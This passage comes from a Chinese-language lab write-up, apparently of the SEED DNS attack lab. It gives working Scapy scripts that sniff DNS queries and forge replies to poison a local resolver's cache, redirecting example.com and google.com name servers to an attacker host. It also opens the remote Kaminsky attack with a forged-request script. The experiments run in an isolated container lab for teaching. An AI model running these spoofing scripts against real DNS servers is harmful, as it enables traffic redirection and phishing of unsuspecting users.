class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and (src host 10.9.0.53)&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p>运行代码：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701760034492-3ddc2be5-ca88-429b-b5bc-061245c7cca3.png#averageHue=%23232222&clientId=uec501cad-8b7d-4&from=paste&height=190&id=u4d145dc0&originHeight=300&originWidth=664&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=20529&status=done&style=none&taskId=u5fb790b4-52bd-455b-8522-87e92046dd1&title=&width=421.587320732873" alt="image.png"><br />user发起一次查询，成功实现欺骗<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701760008843-c47a398d-6795-431a-8e53-4468e4cb4ede.png#averageHue=%23252322&clientId=uec501cad-8b7d-4&from=paste&height=406&id=uf9101896&originHeight=639&originWidth=964&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=69474&status=done&style=none&taskId=uc275bfe0-c62b-4b04-9f9d-5c910735233&title=&width=612.063519859171" alt="image.png"><br />将cache dump下来并保存到文件中，因为容器中没有vim，所以我们在对应目录用直接用cat查看里面的内容<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701760378640-b5b13867-e9c8-452a-9fd1-d599cff96972.png#averageHue=%23282524&clientId=uec501cad-8b7d-4&from=paste&height=231&id=u5bd9ac75&originHeight=364&originWidth=977&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=61708&status=done&style=none&taskId=ucd54e3bc-97bd-4e21-a5ec-42fc0127683&title=&width=620.3174884879774" alt="image.png"><br />发现cache被改变，投毒成功：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701760331332-364b1ff6-ee73-4a96-b8db-0eb34ae4b9cf.png#averageHue=%23252322&clientId=uec501cad-8b7d-4&from=paste&height=389&id=u94e5f197&originHeight=612&originWidth=1246&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=91059&status=done&style=none&taskId=uc68978c3-aed6-4534-a67c-69f1cbbb53d&title=&width=791.1111470378912" alt="image.png"><br><a name="cey1t"></a></p><h4 id="Task-3-Spoofing-NS-Records"><a href="#Task-3-Spoofing-NS-Records" class="headerlink" title="Task 3: Spoofing NS Records"></a><strong>Task 3: Spoofing NS Records</strong></h4><blockquote><p>进一步修改task2代码，实现NS记录的欺骗，以达成<strong>任何example.com</strong>的子域名dns请求都会返回被某恶意权威域名服务器的控制的结果。</p></blockquote><p>编写spoof_ns.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))  </span><br><span class="line">    </span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">    NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">    NSsec2 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns1.attacker32.com&#x27;</span>)</span><br><span class="line">                   </span><br><span class="line">    <span class="comment"># The Additional Section</span></span><br><span class="line">    <span class="comment"># Addsec = DNSRR(rrname=&#x27;ns1.example.net&#x27;, type=&#x27;A&#x27;, ttl=259200, rdata=&#x27;1.2.3.4&#x27;)                </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,</span><br><span class="line">                  ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">2</span>, an=Anssec, ns=NSsec )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701761274307-63a38f56-15cc-4ac5-b1a6-c43fb28ae475.png#averageHue=%232b2423&clientId=uec501cad-8b7d-4&from=paste&height=192&id=u82c48132&originHeight=303&originWidth=970&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=18771&status=done&style=none&taskId=u3a38630f-b767-4acc-835b-ae870c636c2&title=&width=615.873043841697" alt="95a8ccba696fa1608c8367aad452ab1e.png"><br /><strong>给local dns server清除缓存！</strong><br />attacker运行代码，user仍旧通过<a href="http://www.example.com查询/">www.example.com查询</a><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701761651778-9bbef2a6-6106-4816-8525-8e5cf317a401.png#averageHue=%23252120&clientId=uec501cad-8b7d-4&from=paste&height=136&id=ud1938e44&originHeight=187&originWidth=623&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=7675&status=done&style=none&taskId=u0ddadb42-e576-4a0d-a832-66765992a26&title=&width=454.5555725097656" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701761610188-33e35293-c635-4487-9d9f-6d6822477610.png#averageHue=%23232120&clientId=uec501cad-8b7d-4&from=paste&height=311&id=uf50af3de&originHeight=543&originWidth=894&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=34725&status=done&style=none&taskId=u40668d60-5532-4e0d-acac-b2f99f32c27&title=&width=512.6190795898438" alt="image.png"><br />结束代码运行，测试其他子域名：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701761771777-6e4bbfb6-0988-4d02-a6c3-d9bf7f5f6d52.png#averageHue=%23242120&clientId=uec501cad-8b7d-4&from=paste&height=340&id=u3027d076&originHeight=536&originWidth=841&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=36310&status=done&style=none&taskId=u1fc9620c-4ec6-4585-9be2-093171cfb78&title=&width=533.9682782173888" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762312323-ce85fd4c-89ea-4e27-9039-8909a50261f3.png#averageHue=%23232120&clientId=uec501cad-8b7d-4&from=paste&height=345&id=u9218fea8&originHeight=543&originWidth=918&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=37054&status=done&style=none&taskId=u7c19bf8e-1aee-449f-af0f-cf173512535&title=&width=582.857169326472" alt="image.png"><br />将local DNS server的缓存保存到文件中：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762611780-54fa230c-2ec3-4a4c-a533-7ef531d55ebd.png#averageHue=%232d2a26&clientId=uec501cad-8b7d-4&from=paste&height=59&id=u6316bc93&originHeight=93&originWidth=762&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=12414&status=done&style=none&taskId=u55bc83c1-4283-4107-9be9-e4d343f0c39&title=&width=483.80954578079707" alt="image.png"><br />被修改的ns记录：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762510721-6c947842-c77d-4e57-81be-6b580a1c9781.png#averageHue=%23242120&clientId=uec501cad-8b7d-4&from=paste&height=387&id=u9aab3c95&originHeight=610&originWidth=1075&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=54463&status=done&style=none&taskId=u5536a6bd-7e23-430b-a470-46e01159bac&title=&width=682.5397135359013" alt="image.png"><br />刚刚查询的example.com域名：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762565075-3c85cc24-643e-4b1f-84a4-73dceac943b9.png#averageHue=%23252120&clientId=uec501cad-8b7d-4&from=paste&height=211&id=u9f63c411&originHeight=333&originWidth=696&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=19290&status=done&style=none&taskId=u4dd3c0b5-b3a6-4a65-ae55-d40f064378d&title=&width=441.9047819730115" alt="image.png"><br><a name="CSNpP"></a></p><h4 id="Task-4-Spoofing-NS-Records-for-Another-Domain"><a href="#Task-4-Spoofing-NS-Records-for-Another-Domain" class="headerlink" title="Task 4: Spoofing NS Records for Another Domain"></a><strong>Task 4: Spoofing NS Records for Another Domain</strong></h4><blockquote><p>在之前的攻击中，我们成功地毒害了本地DNS服务器的缓存，因此ns.attacker32.com成为了example.com域的命名服务器。受到这次成功的启发，我们希望将其影响扩展到其他领域。也就是说，在由<a href="http://www.example.com查询触发的欺骗响应中,我们想在www.example.com部分中添加额外的条目/">www.example.com查询触发的欺骗响应中，我们想在www.example.com部分中添加额外的条目</a>, ns.attacker32.com也被用作google.com的命名服务器。</p></blockquote><p>编写spoof_ns_anotherdomian.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">NS_NAME = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))  </span><br><span class="line">    </span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)                </span><br><span class="line">    NSsec2 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">    NSsec1 = DNSRR(rrname=<span class="string">&#x27;google.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">    <span class="comment"># NSsec3 = DNSRR(rrname=&#x27;google.example.com&#x27;, type=&#x27;NS&#x27;, ttl=259200, rdata=&#x27;ns.attacker32.com&#x27;)</span></span><br><span class="line">    <span class="comment"># NSsec4 = DNSRR(rrname=&#x27;example.com&#x27;, type=&#x27;NS&#x27;, ttl=259200, rdata=&#x27;ns1.attacker32.com&#x27;)</span></span><br><span class="line">                   </span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,</span><br><span class="line">                ancount=<span class="number">1</span>, nscount=<span class="number">2</span>,  an=Anssec, ns=NSsec1/NSsec2 )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)      </span><br></pre></td></tr></table></figure><p>运行代码：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701845896387-e6cee411-4952-4be0-a6e1-7c2b57f9a806.png#averageHue=%23212020&clientId=u85c33050-56c9-4&from=paste&height=126&id=ud0fc1d50&originHeight=199&originWidth=619&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=8547&status=done&style=none&taskId=u16c33a70-266c-4d2e-ab3a-cdbcb4bba91&title=&width=393.0158908639283" alt="image.png"><br />user端对网址进行dig<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701845937036-46be0543-31d9-4056-a085-75ac31df958a.png#averageHue=%23222120&clientId=u85c33050-56c9-4&from=paste&height=337&id=ud476d2ce&originHeight=530&originWidth=794&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=36374&status=done&style=none&taskId=u39d8f65a-05dd-4f79-b4b3-6c47fbe5b4b&title=&width=504.1270070209355" alt="image.png"><br />将local DNS server的缓存保存到文件中：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762611780-54fa230c-2ec3-4a4c-a533-7ef531d55ebd.png#averageHue=%232d2a26&clientId=uec501cad-8b7d-4&from=paste&height=59&id=kKmiN&originHeight=93&originWidth=762&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=12414&status=done&style=none&taskId=u55bc83c1-4283-4107-9be9-e4d343f0c39&title=&width=483.80954578079707" alt="image.png"><br />被修改的ns记录：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701921323580-9d70b5b5-50f6-4f41-bbf5-b1a6193c38e2.png#averageHue=%23242221&clientId=ubcecf621-0b99-4&from=paste&height=400&id=u7b42d6d3&originHeight=630&originWidth=867&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=49606&status=done&style=none&taskId=u8b1c40e4-cf8e-431b-869b-7fe9a232af7&title=&width=550.4762154750014" alt="image.png"><br><a name="esyPc"></a></p><h4 id="Task-5-Spoofing-Records-in-the-Additional-Section"><a href="#Task-5-Spoofing-Records-in-the-Additional-Section" class="headerlink" title="**Task 5: Spoofing Records in the Additional Section **"></a>**Task 5: Spoofing Records in the Additional Section **</h4><p>按照要求修改攻击代码task5.py构造部分如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">NS_NAME = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))  </span><br><span class="line">    </span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)                </span><br><span class="line">    NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">    NSsec2 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.example.com&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    Addsec1 = DNSRR(rrname=<span class="string">&#x27;ns.attacker32.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>) </span><br><span class="line">    Addsec2 = DNSRR(rrname=<span class="string">&#x27;ns.example.net&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;5.6.7.8&#x27;</span>)</span><br><span class="line">    Addsec3 = DNSRR(rrname=<span class="string">&#x27;www.facebook.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;3.4.5.6&#x27;</span>)</span><br><span class="line">                   </span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,ancount=<span class="number">1</span>, </span><br><span class="line">        nscount=<span class="number">2</span>, arcount=<span class="number">3</span>, an=Anssec, ns=NSsec1/NSsec2, ar= Addsec1/Addsec2/Addsec3)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure><p>清除缓存，Attacker运行代码，user端 dig <a href="http://www.example.com./">www.example.com。</a><br />不知道为什么，发现google的缓存清除不掉：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701927553258-3db6b7ed-e81a-4335-8156-2ee8609c40f1.png#averageHue=%23222120&clientId=ubcecf621-0b99-4&from=paste&height=428&id=u114d76bf&originHeight=815&originWidth=879&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=62469&status=done&style=none&taskId=uce9d3aa3-09f4-461c-808c-c500658a750&title=&width=462.09527587890625" alt="image.png"></p><p><a name="vTOH6"></a></p><h2 id="3-DNS-Remote"><a href="#3-DNS-Remote" class="headerlink" title="3 DNS_Remote"></a><strong>3 DNS_Remote</strong></h2><p><a name="eI7z2"></a></p><h3 id="3-1-环境搭建"><a href="#3-1-环境搭建" class="headerlink" title="3.1 环境搭建"></a>3.1 环境搭建</h3><p>DNS缓存中毒攻击的主要目标是本地DNS服务器。显然，攻击一个真正的服务器是非法的，所以我们需要设置我们自己的DNS服务器来进行攻击实验。实验室环境需要四个独立的机器：一个用于受害者，一个用于DNS服务器，两个用于攻击者。实验室环境设置如图1所示。DNS缓存中毒攻击的主要目标是本地DNS服务器。显然，攻击一个真正的服务器是非法的，所以我们需要设置我们自己的DNS服务器来进行攻击实验。实验室环境需要四个独立的机器：一个用于受害者，一个用于DNS服务器，两个用于攻击者。实验室环境设置如图1所示：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701928444976-96b4d049-6cef-484c-9ff6-64732527f6d8.png#averageHue=%23f1f1f1&clientId=ubcecf621-0b99-4&from=paste&height=333&id=u34e1354c&originHeight=525&originWidth=1315&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=133026&status=done&style=none&taskId=u28c76942-4239-432d-b34d-a7050b93232&title=&width=834.9206728369397" alt="image.png"></p><p>主要欺骗目标为<a href="http://www.example.com,该域名真实ip为93.184.216.34,由icann管理/">www.example.com,该域名真实ip为93.184.216.34，由ICANN管理</a></p><p>停止原来的docker：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702100211362-99ba3a31-ca7d-4afe-86e7-996e029619e0.png#averageHue=%23100e0c&clientId=u47a7314e-7035-4&from=paste&height=231&id=u3efc5535&originHeight=364&originWidth=1056&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=84501&status=done&style=none&taskId=ud2e8b0a3-37e7-4735-b3bd-a13fcccac48&title=&width=670.4762209245691" alt="image.png"><br />在新的目录下重新启动docker:<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702100415014-7915ab1a-ac71-45e6-adf2-1ab1229de642.png#averageHue=%230d0b09&clientId=u47a7314e-7035-4&from=paste&height=420&id=u1bd6f4d2&originHeight=662&originWidth=1054&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=158851&status=done&style=none&taskId=ufc8263df-ffbb-449f-b449-cccd3800d49&title=&width=669.2063795970605" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702100788107-8f2f22a6-79a7-4d7c-bd72-2efa475a623a.png#averageHue=%23100f0e&clientId=u47a7314e-7035-4&from=paste&height=134&id=RiBg6&originHeight=211&originWidth=1053&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=49240&status=done&style=none&taskId=u63deb200-e1f9-49c5-acb4-a21d35a7eb8&title=&width=668.5714589333062" alt="image.png"><br><a name="EsBYy"></a></p><h3 id="3-2-The-Attack-Tasks"><a href="#3-2-The-Attack-Tasks" class="headerlink" title="3.2 The Attack Tasks"></a>3.2 The Attack Tasks</h3><p><a name="Aeoki"></a></p><h4 id="Task-1-The-Kaminsky-Attack"><a href="#Task-1-The-Kaminsky-Attack" class="headerlink" title="Task 1:The Kaminsky Attack"></a>Task 1:The Kaminsky Attack</h4><p> 前述已经完成在同一LAN下的DNS攻击，在同一个LAN下是可以直接看到query包。远程攻击缓存投毒的困难主要在于，响应包的事务id必须与请求包相匹配，而请求包的id通常是随机生成的，不在同一子网无法捕捉包看id，而自己暴力手段猜测id会败在缓存机制下，因为当我们成功之前，正确包已经到达被缓存，在time out 之前，dns server不会再向外查询。</p><p>Kaminsky提出的方案（主动构造对应域名的requests，同时大量不同id响应包响应dns server的请求以欺骗完成缓存中毒攻击）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701929639629-2be29c93-8716-49e1-a081-28504850b3d2.png#averageHue=%23dfdfde&clientId=ubcecf621-0b99-4&from=paste&height=493&id=u0f2f3ce7&originHeight=777&originWidth=1480&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=162074&status=done&style=none&taskId=u8f1a9462-7f89-43d7-b694-bbcd5286188&title=&width=939.6825823564037" alt="image.png"><br />然而，上述假设的攻击忽略了缓存效应。实际上，如果攻击者没有足够幸运地在真正的响应包到达之前做出正确的猜测，那么正确的信息将被DNS服务器缓存一段时间。这种缓存效应使得攻击者无法就相同名称建立另一个响应，因为在缓存超时之前，DNS服务器不会发送该名称的另一个DNS查询。要对同一名称建立另一个响应，攻击者必须等待对该名称的另一个DNS查询，这意味着他&#x2F;她必须等待缓存超时。等待时间可以是数小时或天。<br><a name="uCMeX"></a></p><h4 id="Task-2-Construct-DNS-request"><a href="#Task-2-Construct-DNS-request" class="headerlink" title="Task 2: Construct DNS request"></a>Task 2: Construct DNS request</h4><blockquote><p>此任务主要于发送DNS请求。为了完成攻击，攻击者需要触发目标DNS服务器发送DNS查询，这样他们就有机会欺骗DNS应答。由于攻击者需要多次尝试才能成功，所以最好使用一个程序来自动化这个过程。<br>学生需要编写一个程序来将DNS查询发送到目标DNS服务器（即，在我们的设置中的本地DNS服务器）。学生们的工作是编写这个程序，并演示（使用Wireshark），他们的查询可以触发目标DNS服务器发送相应的DNS查询。</p></blockquote><p>编写gen_dns_request.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">srcIP = <span class="string">&#x27;10.9.0.1&#x27;</span>   <span class="comment"># attacker</span></span><br><span class="line">dstIP = <span class="string">&#x27;10.9.0.53&#x27;</span>  <span class="comment"># Local DNS Server</span></span><br><span class="line"></span><br><span class="line">ip  = IP (dst=dstIP, src=srcIP)</span><br><span class="line">udp = UDP(dport=<span class="number">53</span>, sport=<span class="number">50945</span>, chksum=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The C code will modify the qname field</span></span><br><span class="line">Qdsec = DNSQR(qname=<span class="string">&#x27;aaaaa.example.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dns   = DNS(<span class="built_in">id</span>=<span class="number">0xAAAA</span>, qr=<span class="number">0</span>, qdcount=<span class="number">1</span>, qd=Qdsec)</span><br><span class="line"></span><br><span class="line">pkt = ip/udp/dns</span><br><span class="line">send(pkt) </span><br></pre></td></tr></table></figure><p>经wirshark抓包可以看到，local dns server 10.9.0.53向别的dns server发起查询，由于dns请求数据包为伪造,所以当主机收到回复的dns报文后,会产生ICMP端口不可达的回复报文：<br /><img 